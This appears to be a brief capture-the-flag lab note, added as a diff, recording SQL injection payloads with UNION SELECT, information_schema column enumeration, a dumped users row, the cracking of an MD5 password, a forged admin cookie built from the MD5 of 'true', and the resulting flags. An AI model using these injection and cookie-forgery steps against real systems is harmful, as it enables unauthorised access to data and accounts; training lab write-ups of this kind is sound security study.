@@ -1,0 +1,42 @@
+/members:
+input:	1 UNION SELECT 1, version() limit 1,1
+ID: 1 UNION SELECT 1, version() limit 1,1 
+First name: 1
+Surname : 5.5.44-0ubuntu0.12.04.1
+
+----------------------------------
+1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
+
+Table: users
+Colomn : user_id
+Colomn : first_name
+Colomn : last_name
+Colomn : town
+Colomn : country
+Colomn : planet
+Colomn : Commentaire
+Colomn : countersign
+
+
+------------------------------------------------------------------------------------
+user_id:		5
+first_name:		Flag
+last_name:		GetThe
+town:			42
+country:		42
+planet:			42
+Commentaire:	Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+countersign:	5ff9d0165b4f92b14994e5c685cdce28
+
+countersign MD5 > 	FortyTwo
+					fortytwo
+					sha256 > 	10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+								10A16D834F9B1E4068B25C4C46FE0284E99E44DCEAF08098FC83925BA6310FF5
+
+------------------------------------------------------------------------------------
+cookies: iamadmin
+	false en md5
+	md5 de true: b326b5062b2f0e69046810717534cb09
+
+
+	Good job! Flag : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3
